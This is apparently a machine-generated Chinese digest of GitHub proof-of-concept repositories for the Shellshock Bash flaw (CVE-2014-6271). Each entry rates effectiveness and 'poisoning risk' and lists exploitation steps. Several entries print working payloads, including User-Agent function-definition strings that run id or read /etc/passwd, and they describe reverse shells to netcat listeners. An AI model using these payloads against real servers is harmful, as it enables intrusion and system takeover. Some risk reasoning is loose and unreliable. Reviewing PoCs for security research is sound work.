**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** through 4.3

**利用条件:** 目标系统使用CGI，OpenSSH等方式，且Bash版本在受影响范围内

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2014-6271，又名Shellshock，是一个存在于GNU Bash中的高危漏洞。该漏洞允许攻击者通过特制的、包含恶意代码的环境变量，在目标系统上执行任意命令。漏洞利用的方式是：通过将包含函数定义的恶意字符串作为环境变量的值传递给Bash，Bash在解析这些环境变量时，会错误地执行函数定义后面的命令。漏洞利用代码分析：提供的Dockerfile构建了一个包含易受攻击的Bash版本（4.3.0）和Apache HTTP Server的Docker镜像。`safe.cgi`和`victim.cgi`脚本被添加到`/var/www/html/`目录下。`victim.cgi`使用易受攻击的Bash版本，而`safe.cgi` 使用修复后的版本（但提供的代码中，两个cgi都一样，都是直接输出helloworld）。攻击者可以通过修改User-Agent头，或者通过其他CGI变量传递恶意代码，从而在服务器上执行命令。根据readme.md的描述，向victim.cgi发送包含payload的User-Agent，可以触发漏洞。例如：

`User-Agent: () { foo; }; echo Content-Type: text/plain; echo; /usr/bin/id`

该漏洞利用的有效性较高，因为漏洞原理简单，且影响范围广泛。**投毒风险评估：**代码仓库中可能存在作者隐藏的恶意代码的风险较低，这里评估为1%。主要原因是：Dockerfile比较简单，只是构建了一个包含特定版本Bash和Apache HTTP Server的镜像，没有发现明显的后门代码。safe.cgi和victim.cgi 脚本本身也比较简单，只是输出“Hello world”，并没有包含任何可疑的逻辑。flagA文件只是一个标记文件，不包含任何可执行代码。虽然不能完全排除作者在镜像构建过程中隐藏恶意代码的可能性，但从目前的代码来看，这种可能性很小。

**利用方式总结：**

1.  **确定目标系统使用的Bash版本在受影响范围内（<=4.3）。**
2.  **找到一个可以设置环境变量的入口点，例如CGI脚本、OpenSSH的ForceCommand等。**
3.  **构造包含恶意代码的环境变量，例如：`() { :; }; /usr/bin/id`。**
4.  **将该环境变量传递给Bash。**
5.  **Bash解析环境变量时，会执行恶意代码。**

利用代码中的`victim.cgi`脚本是一个CGI入口点，攻击者可以通过修改HTTP请求头（例如User-Agent）来设置环境变量，从而触发漏洞。

**项目地址:** [cyberharsh/Shellbash-CVE-2014-6271](https://github.com/cyberharsh/Shellbash-CVE-2014-6271)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #20

**来源**: [CVE-2014-6271-hadrian3689_shellshock.md](../2014/CVE-2014-6271-hadrian3689_shellshock.md)

## CVE-2014-6271 Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程代码执行，系统完全控制

**影响版本:** Bash <= 4.3

**利用条件:** 目标系统存在CGI脚本或通过OpenSSH等方式设置环境变量

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271，也被称为Shellshock，是一个存在于GNU Bash中的远程代码执行漏洞。该漏洞允许攻击者通过构造包含恶意代码的环境变量来执行任意命令。

**有效性：**
提供的POC代码是有效的。该Python脚本利用Shellshock漏洞通过User-Agent头注入恶意Bash代码，从而在目标系统上执行命令，可以实现反向shell或伪交互式shell。

**投毒风险：**
该脚本主要功能是利用Shellshock漏洞，但代码中存在一定的投毒风险：
*   **风险点：** `shellshock.py`中的payload构造部分，即`payload = "() { :;}; echo; /bin/bash -c 'echo " + cmd + " | base64 -d | sh'"`。虽然脚本本身的目标是实现反向shell，但是攻击者可以修改`cmd`变量的内容，插入恶意的、非反向shell的代码，进行破坏或植入后门。
*   **缓解措施：** 使用者应仔细审查脚本内容，尤其是`cmd`变量的赋值部分，确保脚本执行的是预期操作，并且来自可信来源。
*   **投毒风险百分比:** 10%。主要是脚本中自定义命令的灵活性可能被滥用，并非恶意代码。大部分代码功能清晰，实现的是漏洞利用逻辑。

**利用方式：**
1.  **漏洞原理：** Bash在解析环境变量时，如果环境变量的值包含函数定义，Bash会执行函数定义后面的字符串。攻击者可以利用这个特性，在环境变量中注入恶意代码。
2.  **攻击方法：**
    *   **通过HTTP User-Agent头：** POC脚本通过修改HTTP请求的User-Agent头，将包含恶意代码的环境变量传递给服务器。如果服务器使用Bash处理User-Agent头（例如，通过CGI脚本），那么恶意代码就会被执行。
    *   **反向Shell：** 脚本通过构造Bash命令，建立与攻击者机器的反向TCP连接，从而获得目标系统的shell访问权限。
    *   **正向Shell (防火墙绕过)：** 脚本创建一个命名管道(FIFO)用于输入和输出，攻击者通过HTTP请求向管道写入命令，并读取管道的输出来实现交互式shell。这种方式可以绕过一些防火墙的限制。
3.  **利用条件：**
    *   目标系统运行着存在Shellshock漏洞的Bash版本。
    *   存在可以传递环境变量给Bash的途径，例如CGI脚本、OpenSSH的ForceCommand等。
    *   如果使用反向shell，目标系统需要能够连接到攻击者的机器。

**项目地址:** [hadrian3689/shellshock](https://github.com/hadrian3689/shellshock)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #21

**来源**: [CVE-2014-6271-hanmin0512_CVE-2014-6271_pwnable.md](../2014/CVE-2014-6271-hanmin0512_CVE-2014-6271_pwnable.md)

## CVE-2014-6271 Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 命令注入

**影响应用:** Bash

**危害等级:** 高危，可导致远程代码执行

**影响版本:** <= 4.3

**利用条件:** 需要目标系统存在CGI脚本、OpenSSH等利用入口，允许设置环境变量

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2014-6271，又名Shellshock，是一个存在于GNU Bash中的命令注入漏洞。攻击者可以构造包含恶意代码的环境变量，当Bash shell执行时，会将恶意代码一并执行，从而达到远程命令执行的目的。

**有效性：**

提供的POC代码是有效的，它演示了利用Shellshock漏洞的基本原理，即通过设置包含恶意代码的环境变量来执行任意命令。shellshock.c 文件通过提权后执行 bash 命令来证明改漏洞的利用。

**投毒风险：**

代码仓库中未发现明显的投毒代码。shellshock.c 只是简单的提权后执行了 bash 命令。

**利用方式：**

1.  **漏洞原理：** Bash在处理环境变量时，如果环境变量的值以函数定义开头，Bash会尝试解析并执行该函数定义之后的代码。如果攻击者能够控制环境变量的内容，就可以注入恶意的代码。

2.  **利用场景：**

    *   **CGI脚本：**  Web服务器在执行CGI脚本时，会将HTTP请求头中的某些字段作为环境变量传递给脚本。攻击者可以修改这些HTTP请求头，注入恶意代码。
    *   **OpenSSH：**  如果OpenSSH启用了`ForceCommand`功能，并且`ForceCommand`中使用了Bash shell，攻击者可以通过设置环境变量来执行命令。
    *   **DHCP客户端：**  某些DHCP客户端脚本会执行Bash shell，攻击者可以通过控制DHCP服务器，设置包含恶意代码的环境变量。

3.  **利用步骤：**

    a.  确定目标系统存在Bash shell，且版本小于等于4.3。
    b.  找到一个可以通过环境变量影响Bash执行的入口（例如CGI脚本）。
    c.  构造包含恶意代码的环境变量，例如：
        `export payload='() { ignored; }; /bin/cat /etc/passwd'`
    d.  将该环境变量传递给Bash shell执行。
    e.  如果漏洞存在，`/etc/passwd`文件的内容将被输出。

**项目地址:** [hanmin0512/CVE-2014-6271_pwnable](https://github.com/hanmin0512/CVE-2014-6271_pwnable)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #22

**来源**: [CVE-2014-6271-indiandragon_Shellshock-Vulnerability-Scan.md](../2014/CVE-2014-6271-indiandragon_Shellshock-Vulnerability-Scan.md)

## CVE-2014-6271 ShellShock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，允许远程攻击者执行任意代码

**影响版本:** <= 4.3

**利用条件:** 目标系统使用Bash，且攻击者能够通过环境变量影响Bash执行

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2014-6271（ShellShock）是一个存在于GNU Bash中的高危漏洞。该漏洞允许攻击者通过构造特制的包含恶意代码的环境变量，在目标系统上执行任意命令。漏洞利用方式主要依赖于Bash处理函数定义后尾随字符串的方式。攻击者可以将恶意代码嵌入到环境变量中，当Bash解析这些变量时，尾随的恶意代码会被执行。

**有效性评估：**
漏洞库信息和搜索结果均表明该漏洞真实存在且危害严重，存在大量可利用的场景。利用代码库中提供的文件看起来是GNU GPL许可证，本身不包含攻击代码，但实际漏洞利用需要构造特定的环境变量。

**投毒风险评估：**
提供的漏洞利用代码片段（LICENSE文件）本身不具备投毒性，它只是一个开源协议文件。投毒风险主要存在于漏洞利用的上下文和攻击者构造的恶意环境变量中。如果攻击者散布包含恶意代码的环境变量构造方法，可能会诱导用户执行有害操作。但仅分析提供的LICENSE文件，投毒风险极低，约为1%。

**利用方式分析：**
1.  **环境变量注入：** 攻击者构造包含恶意代码的环境变量，例如：`(){ :; }; /bin/eject`。
2.  **触发Bash解析：** 寻找能够触发Bash解析这些环境变量的入口点。常见的入口点包括：
    *   OpenSSH的`ForceCommand`。
    *   Apache HTTP Server的`mod_cgi`和`mod_cgid`模块。
    *   DHCP客户端脚本。
    *   其他任何跨越权限边界并设置环境变量的Bash执行场景。
3.  **远程代码执行：** 当Bash解析包含恶意代码的环境变量时，嵌入的命令会被执行，导致远程代码执行。

根据搜索结果，该漏洞已存在多年，但由于其影响范围广泛，仍然值得关注。应及时更新Bash版本，并检查系统配置，避免受到攻击。

**项目地址:** [indiandragon/Shellshock-Vulnerability-Scan](https://github.com/indiandragon/Shellshock-Vulnerability-Scan)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #23

**来源**: [CVE-2014-6271-knightc0de_Shellshock_vuln_Exploit.md](../2014/CVE-2014-6271-knightc0de_Shellshock_vuln_Exploit.md)

## CVE-2014-6271 Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程代码执行，系统权限获取

**影响版本:** <= 4.3

**利用条件:** 目标系统使用Bash作为shell，且存在CGI脚本或允许通过环境变量传递命令

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271，又名Shellshock，是一个存在于GNU Bash中的高危漏洞。该漏洞允许攻击者通过构造特制的包含恶意代码的环境变量，在目标系统上执行任意命令。当Bash shell处理这些环境变量时，会在函数定义后执行嵌入的命令，从而导致安全风险。

**有效性：**

提供的PoC代码是有效的，它通过`pwn`库和`requests`库实现漏洞利用。该脚本通过构造包含恶意Bash代码的HTTP请求头（User-Agent, Cookie, Referer）发送到目标服务器，如果目标服务器存在CGI脚本且使用存在漏洞的Bash版本，则会执行恶意代码，并反弹shell到攻击者指定的IP地址和端口。

**投毒风险：**

该仓库中存在一定的投毒风险，风险评估为10%。虽然作者提供了免责声明，并且主要代码逻辑是为了利用Shellshock漏洞，但仍然存在潜在的后门或恶意修改的可能性，尽管看起来相对较低：
*   **依赖风险**: 依赖`pwn`和`requests`库，如果这些库被篡改，可能引入恶意代码。
*   **Payload定制**: Payload的构造方式可能被修改，引入额外的恶意行为。

**利用方式：**

1.  **确定目标：** 寻找运行CGI脚本的web服务器，或者其他任何可能通过环境变量传递命令给Bash的应用程序。
2.  **构造Payload：** 构造一个包含恶意Bash代码的环境变量，例如：`() { :;}; /bin/bash -c 'command'`。
3.  **传递Payload：** 通过HTTP请求头（User-Agent, Cookie, Referer）或者其他方式将payload作为环境变量传递给目标系统。
4.  **触发漏洞：** 当Bash shell处理包含恶意代码的环境变量时，会执行嵌入的命令。
5.  **获取权限：** 利用反弹shell或其他方式获取目标系统的控制权。

**项目地址:** [knightc0de/Shellshock_vuln_Exploit](https://github.com/knightc0de/Shellshock_vuln_Exploit)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #24

**来源**: [CVE-2014-6271-mochizuki875_CVE-2014-6271-Apache-Debian.md](../2014/CVE-2014-6271-mochizuki875_CVE-2014-6271-Apache-Debian.md)

## CVE-2014-6271-Apache-Debian Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，允许远程攻击者执行任意代码

**影响版本:** <= 4.3

**利用条件:** 需要目标系统存在CGI脚本，且Apache配置允许执行CGI脚本，并且Bash版本存在漏洞。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2014-6271（Shellshock）是一个影响 GNU Bash 的高危漏洞。该漏洞源于 Bash 处理环境变量中函数定义后附加字符串的方式存在缺陷，允许远程攻击者通过构造特殊的环境变量来执行任意代码。

**有效性：**

根据提供的 PoC 代码（/tmp/47c4ac3d27239b789878e6360b54dc21/README.md），该 PoC 旨在演示如何在 Apache Debian 环境中利用 CVE-2014-6271 漏洞。它包含构建易受攻击的 Docker 镜像和 Kubernetes 清单的步骤，以及利用漏洞的演示。

PoC 代码的有效性通过以下事实得到证实：

*   它提供了一个明确的攻击向量：通过 `User-Agent` HTTP 头传递恶意构造的 Bash 函数定义。
*   它演示了如何获得受害容器上的 shell 访问权限。
*   它演示了如何在受害容器上修改 Web 页面内容。

因此，提供的 PoC 代码可以被认为是有效的。

**投毒风险：**

评估 PoC 代码的投毒风险表明，主要风险较低，约为 5%。

*   **高风险文件:** 位于`/tmp/47c4ac3d27239b789878e6360b54dc21/web-insecure/Dockerfile`，这个Dockerfile 用于构建包含漏洞环境，该漏洞是已知的，构建目的是用于演示验证，所以它不是投毒代码。
*   **低风险文件:** 其他文件（例如 web-secure 目录中的文件和 k8s 清单文件）似乎是良性的，并且用于设置安全的环境以进行比较或者演示。
*   **总体分析:**

虽然该存储库的目的是演示漏洞，但攻击者可能会修改 `web-insecure/Dockerfile` 以包含其他恶意软件或后门。用户在使用这些文件构建镜像时应谨慎。

**利用方式：**

利用 CVE-2014-6271 漏洞涉及以下步骤：

1.  **确定目标：**识别运行易受攻击的 Bash 版本的系统，该系统通常用于处理 Web 请求或 CGI 脚本。
2.  **构造攻击负载：**创建一个包含恶意 Bash 函数定义的特殊构造的环境变量。
3.  **传递攻击负载：**通过 HTTP 请求头（例如 `User-Agent`）或 CGI 脚本可以访问的任何其他环境变量将攻击负载传递到目标系统。
4.  **执行任意代码：**当 Bash 处理恶意环境变量时，它会执行其中嵌入的命令。

在提供的 PoC 代码中，利用方式如下：

1.  攻击者设置一个 netcat 监听器 (`nc -nvlp 5050`)。
2.  攻击者使用 curl 命令向易受攻击的 Web 服务发送一个 HTTP 请求，其中 `User-Agent` 头包含一个恶意的 Bash 函数定义。这个函数定义包含执行反向 shell 的命令，将 shell 连接到攻击者的 netcat 监听器。
3.  当 Web 服务（通常通过 CGI 脚本）执行 Bash 时，Bash 会处理恶意的 `User-Agent` 头，执行反向 shell 命令，并允许攻击者访问受害容器上的 shell。

**项目地址:** [mochizuki875/CVE-2014-6271-Apache-Debian](https://github.com/mochizuki875/CVE-2014-6271-Apache-Debian)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #25

**来源**: [CVE-2014-6271-moften_CVE-2014-6271.md](../2014/CVE-2014-6271-moften_CVE-2014-6271.md)

## CVE-2014-6271 Shellshock漏洞扫描器

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，允许攻击者执行任意命令

**影响版本:** <= 4.3

**利用条件:** 目标系统运行存在漏洞的Bash版本，并且存在CGI脚本或其他方式通过环境变量调用Bash。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271 (Shellshock) 漏洞允许攻击者通过特制的 Bash 环境变量执行任意命令。漏洞存在于 Bash 处理函数定义后尾随字符串的方式中。 

**有效性：**
提供的PoC代码是一个Python脚本，用于扫描目标URL是否存在Shellshock漏洞。它通过发送包含恶意payload的User-Agent头部的HTTP请求到常见的CGI脚本路径，然后检查响应中是否包含特定的字符串（'VULNERABLE-SHELLSHOCK'）来判断目标是否易受攻击。根据漏洞库信息和搜索结果，该漏洞利用方式是有效的。

**投毒风险：**
该仓库包含一个Python脚本和一个README.md文件。Python脚本的功能是发送包含特定payload的HTTP请求并检查响应。README.md文件仅包含项目名称和描述。
 *  投毒代码分析: 该python脚本主要功能是发送特定Header的请求到服务器端CGI脚本,存在以下潜在的投毒风险：
    *  **CGI脚本路径猜测：**脚本中包含一个常见的CGI脚本路径列表。如果攻击者控制了该列表，可以通过添加恶意CGI路径来欺骗扫描者，引导他们攻击不存在的或伪造的服务。
    *  **Payload修改：**虽然当前的payload是良性的，用于检测漏洞，但攻击者可能修改payload以执行恶意操作，例如上传后门或执行拒绝服务攻击。
    *  **扫描行为：** 扫描行为本身可能被目标系统检测为恶意活动，从而触发防御机制或记录扫描者的IP地址。
    *  **误报风险：**脚本依赖于特定的字符串（'VULNERABLE-SHELLSHOCK'）来判断漏洞是否存在。如果目标服务器返回包含该字符串的响应，即使实际不存在漏洞，脚本也会报告为易受攻击。修改这个字串可以导致信息泄露或者权限提升,因此可能存在一定风险。

**利用方式：**
1.  **环境变量注入：** 攻击者构造一个包含恶意代码的 Bash 函数定义的环境变量。例如：`(){ :;}; /usr/bin/id`。
2.  **触发 Bash 执行：** 通过 CGI 脚本、OpenSSH 的 ForceCommand 功能、DHCP 客户端脚本等方式，将构造的包含恶意代码的环境变量传递给 Bash。
3.  **代码执行：** 当 Bash 执行上述环境变量时，由于漏洞，尾随在函数定义后的命令会被执行，从而实现远程代码执行。

**总结：**
该PoC代码利用了Shellshock漏洞，通过环境变量注入执行任意命令。漏洞影响范围广泛，修复难度较大，危害程度高。


**项目地址:** [moften/CVE-2014-6271](https://github.com/moften/CVE-2014-6271)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #26

**来源**: [CVE-2014-6271-mritunjay-k_CVE-2014-6271.md](../2014/CVE-2014-6271-mritunjay-k_CVE-2014-6271.md)

## CVE-2014-6271 ShellShock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 命令注入

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** <= 4.3

**利用条件:** 目标系统存在CGI脚本或其他方式允许通过环境变量影响Bash执行

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2014-6271，又名ShellShock，是GNU Bash中的一个严重漏洞。攻击者可以通过构造包含恶意代码的环境变量，当这些环境变量被传递给Bash执行的进程时，会导致远程代码执行。 

**有效性：** 提供的POC代码是有效的。它通过设置`User-Agent`头来传递恶意payload。如果目标URL指向一个CGI脚本，且该脚本使用Bash处理环境变量，那么攻击者就可以执行任意命令。POC代码还包含一个检查机制，如果URL不包含`/cgi-bin/status`，它会提示用户是否要添加该路径，这增加了攻击的灵活性。

**投毒风险：** 在提供的`exploit.py`和`README.md`文件中，没有发现任何明显的投毒代码。代码逻辑清晰，目标是利用ShellShock漏洞执行命令。没有发现作者尝试引入恶意行为，例如上传恶意文件、植入后门或窃取凭据。因此，投毒风险评估为0%。

**利用方式：** 

1.  **确定目标：** 找到运行存在漏洞的Bash版本的系统，该系统需要具有某种暴露点，该暴露点允许通过环境变量注入的方式利用Bash。常见的暴露点包括CGI脚本、OpenSSH的`ForceCommand`特性以及某些DHCP客户端。
2.  **构造Payload：** 构造一个包含恶意代码的环境变量。Payload的形式通常为`() { :; }; <command>`。其中`<command>`是要执行的shell命令。
3.  **传递Payload：** 将构造的Payload作为环境变量传递给Bash。对于CGI脚本，这可以通过设置HTTP头的`User-Agent`字段来实现，如提供的POC代码所示。在其他场景中，可能需要使用其他方法来设置环境变量。
4.  **执行命令：** 当Bash执行接收到包含Payload的CGI脚本时，它会解析环境变量，触发漏洞，并执行注入的命令。
5.  **验证执行结果:** POC脚本会打印出`page`的内容,命令执行的结果将会嵌入到返回的内容中.

**综上所述：** 提供的POC代码利用了ShellShock漏洞，通过构造恶意环境变量并在目标系统上触发执行，实现了远程命令执行。虽然漏洞利用风险很高，但提供的代码本身没有发现投毒风险。

**项目地址:** [mritunjay-k/CVE-2014-6271](https://github.com/mritunjay-k/CVE-2014-6271)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #27

**来源**: [CVE-2014-6271-opsxcq_exploit-CVE-2014-6271.md](../2014/CVE-2014-6271-opsxcq_exploit-CVE-2014-6271.md)

## CVE-2014-6271 ShellShock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** <= 4.3

**利用条件:** 目标系统使用Bash，并且攻击者能够控制环境变量。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271，也被称为Shellshock，是一个存在于GNU Bash中的严重漏洞。该漏洞源于Bash处理环境变量中函数定义之后存在的字符串的方式。攻击者可以通过构造包含恶意代码的环境变量，当这些环境变量被Bash解析时，就能执行任意命令。

**有效性：**

根据漏洞库信息和搜索结果，CVE-2014-6271是一个经过验证的漏洞，具有较高的利用成功率。

提供的Dockerfile和相关文件构成了一个可以利用该漏洞的环境。Dockerfile设置了一个基于Debian Wheezy的Apache服务器，并部署了一个CGI脚本（vulnerable），该脚本会调用Bash。攻击者可以通过设置恶意的环境变量，然后向CGI脚本发送HTTP请求来触发漏洞，从而在服务器上执行任意命令。

**投毒风险：**

分析提供的文件，存在一定的投毒风险，约为10%。Dockerfile中从/packages安装了预先存在的软件包。虽然COPY指令本身没有明显的恶意代码，但有需要审核的地方：
1. Dockerfile 从 `/packages` 目录安装软件包，而软件包的具体内容没有给出。如果这些包由攻击者控制，可能包含恶意后门。
2. `vulnerable` CGI 脚本的内容需要仔细审查，如果脚本本身存在后门，则存在投毒风险
3. main.sh 的内容也需要确认, 是否有安装一些额外的包.

**利用方式：**

1.  **CGI脚本利用：**  最常见的利用方式是通过CGI脚本。攻击者向Web服务器发送包含恶意环境变量的HTTP请求。如果Web服务器配置为使用Bash执行CGI脚本，Bash将解析这些环境变量，导致恶意代码执行。
2.  **OpenSSH ForceCommand：**  如果OpenSSH配置了ForceCommand选项，攻击者可以通过修改环境变量来执行任意命令。
3.  **DHCP客户端：**  某些DHCP客户端在执行脚本时会设置环境变量，攻击者可以通过控制DHCP服务器来注入恶意环境变量。

总之，CVE-2014-6271是一个高危漏洞，利用简单，影响广泛。需要及时修补受影响的系统。


**项目地址:** [opsxcq/exploit-CVE-2014-6271](https://github.com/opsxcq/exploit-CVE-2014-6271)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #28

**来源**: [CVE-2014-6271-rsherstnev_CVE-2014-6271.md](../2014/CVE-2014-6271-rsherstnev_CVE-2014-6271.md)

## CVE-2014-6271 - ShellShock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程命令执行

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程命令执行和系统控制

**影响版本:** <= 4.3

**利用条件:** 目标系统运行Bash且存在可利用的入口点，例如CGI脚本、OpenSSH ForceCommand等。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2014-6271，也被称为ShellShock，是一个存在于GNU Bash中的远程命令执行漏洞。该漏洞允许攻击者通过构造包含恶意代码的环境变量来执行任意命令。漏洞利用的核心在于Bash在处理函数定义后附加的字符串时存在缺陷。 

**有效性评估：**
提供的Python POC代码利用了ShellShock漏洞，其有效性较高。代码首先通过发送包含特定字符串（`HelloKittyFromN0rdeN!`）的请求头来检测目标系统是否存在漏洞。如果检测到漏洞，则进入交互式shell，允许攻击者执行任意命令。

**利用方式分析：**
1.  **漏洞检测：** POC首先发送一个HTTP请求，其中User-Agent、Referer和Cookie头都包含恶意的Bash代码。这段代码的目的是在受影响的Bash版本中执行`echo HelloKittyFromN0rdeN!`命令，从而验证漏洞是否存在。
2.  **命令执行：** 如果漏洞存在，POC会进入一个循环，允许攻击者输入命令。输入的命令会被Base64编码，然后插入到HTTP请求头中。服务器端的Bash会解码并执行这些命令。
3.  **向量：** 此POC利用HTTP请求头（User-Agent, Referer, Cookie）作为攻击向量，这些头通常会被传递给服务器并可能被Bash处理。

**投毒风险分析：**
POC代码主要功能是检测和利用ShellShock漏洞。分析代码后，发现潜在的投毒风险较低（约1%）。

*   **Base64编码：** 使用Base64编码命令可能会被认为是一种混淆手段，但这是为了确保命令在HTTP头中传输的安全性，并非恶意隐藏代码。
*   **第三方库：** POC使用了requests库，理论上存在requests库被篡改的风险。但是，requests是常用的Python库，被篡改的可能性极低。
*   **BASE64_PATH变量:** 该变量用于指定`base64`命令的路径,如果该路径被修改为恶意程序,会存在投毒风险,但原代码中该变量默认为`/usr/bin/base64`,属于正常路径. 
*   **风险点：** 主要风险集中在使用未经授权的服务器上执行任意命令，这本身就是漏洞利用的目的，而不是POC代码引入的额外风险。

**搜索引擎结果印证：**
搜索结果确认了CVE-2014-6271是ShellShock漏洞，并且是广泛存在的，有多种利用方式。这些结果也强调了该漏洞的严重性和潜在影响。

综上所述，该POC代码的有效性较高，投毒风险较低，主要用于检测和利用ShellShock漏洞，允许攻击者通过HTTP请求头在目标系统上执行任意命令。

**项目地址:** [rsherstnev/CVE-2014-6271](https://github.com/rsherstnev/CVE-2014-6271)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---



---

## POC #12

**来源**: [CVE-2014-6271-TheRealCiscoo_Shellshock-Exploit.md](../2014/CVE-2014-6271-TheRealCiscoo_Shellshock-Exploit.md)

## CVE-2014-6271 ShellShock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程命令执行

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 1.14 - 4.3

**利用条件:** 目标系统存在CGI脚本或其他方式允许通过HTTP Header设置环境变量，且Bash版本在受影响范围内。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2014-6271，也被称为ShellShock，是一个存在于GNU Bash中的高危漏洞。该漏洞源于Bash处理环境变量中函数定义后附加字符串的方式存在缺陷，攻击者可以通过构造包含恶意代码的环境变量，当Bash执行相关程序时，恶意代码会被执行，从而实现远程命令执行。从漏洞库信息和搜索引擎结果来看，此漏洞影响广泛，修复不彻底，危害巨大。

**有效性：**
提供的Python POC代码利用了ShellShock漏洞。它构造了一个包含恶意Bash代码的User-Agent头，并向目标URI发送GET请求。如果目标URI是一个CGI脚本，或者其他任何调用Bash并使用该User-Agent头作为环境变量的应用程序，那么恶意的Bash代码就会被执行，从而建立反向shell。

**投毒风险：**
该仓库的投毒风险较低。虽然任何代码都可能包含恶意成分，但此POC代码相对简单，主要功能是利用已知的ShellShock漏洞。潜在的风险可能包括：

*   作者可能在反向shell的Payload中植入其他恶意命令。但通过代码审计，反向shell的Payload清晰可见，未发现隐藏的恶意代码。
*   该代码可能针对特定系统环境做了优化，如果攻击者不了解这些优化，可能会导致利用失败，或留下攻击痕迹。但这种“优化”也可以被视作一种隐蔽的攻击尝试。

综合评估，该代码存在恶意投毒的可能性较低，约为5%。这个百分比代表一种潜在的风险，需要仔细审查代码才能完全消除。

**利用方式：**
1.  **确定目标：** 找到运行受影响Bash版本的服务器，并确认存在可以通过HTTP头设置环境变量的CGI脚本或其他应用。
2.  **准备攻击环境：** 在攻击者机器上设置NetCat监听指定端口，等待反向shell连接：`ncat -lkvnp <attacker-port>`。
3.  **构造Payload：** 使用POC脚本，指定目标IP地址、URI、攻击者IP地址和监听端口。
4.  **发送请求：** 运行POC脚本，它会构造一个包含恶意代码的HTTP GET请求，并将User-Agent设置为包含恶意代码的环境变量。
5.  **利用漏洞：** 如果目标存在漏洞，Bash会执行User-Agent头中的恶意代码，建立与攻击者机器的反向shell连接。
6.  **控制目标：** 攻击者通过反向shell控制目标系统，执行任意命令。

**项目地址:** [TheRealCiscoo/Shellshock-Exploit](https://github.com/TheRealCiscoo/Shellshock-Exploit)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #13

**来源**: [CVE-2014-6271-YunchoHang_CVE-2014-6271-SHELLSHOCK.md](../2014/CVE-2014-6271-YunchoHang_CVE-2014-6271-SHELLSHOCK.md)

## CVE-2014-6271 Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 命令注入

**影响应用:** GNU Bash

**危害等级:** 高危，允许远程攻击者执行任意代码

**影响版本:** 通过 4.3

**利用条件:** 目标系统使用Bash，且存在允许通过环境变量影响Bash执行的接口(例如CGI脚本)

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271（Shellshock）是一个存在于GNU Bash中的命令注入漏洞。该漏洞允许远程攻击者通过构造包含恶意代码的环境变量，在目标系统上执行任意命令。利用方式通常涉及以下步骤：

1.  **确定目标系统是否易受攻击：** 检查目标系统是否正在运行易受攻击的Bash版本(通过 4.3).
2.  **寻找攻击入口点：** 寻找目标系统上允许通过环境变量影响Bash执行的接口，例如CGI脚本、OpenSSH的ForceCommand功能、DHCP客户端等。
3.  **构造恶意环境变量：** 构造包含恶意代码的函数定义的环境变量。例如：`() {{ :;}}; command`，其中`command`是要执行的命令。
4.  **发送包含恶意环境变量的请求：** 将构造的恶意环境变量通过HTTP请求头、SSH连接或其他方式传递给目标系统。
5.  **触发漏洞：** 目标系统在执行Bash时，会解析包含恶意代码的环境变量，从而执行攻击者指定的命令。

提供的POC代码`AutoShocker.py`是一个利用Shellshock漏洞的自动化脚本，具备以下功能：

*   **命令执行：** 允许攻击者在目标系统上执行任意命令，并将结果返回。
*   **反向Shell：** 允许攻击者在目标系统上建立反向Shell连接，从而获得对目标系统的完全控制权。

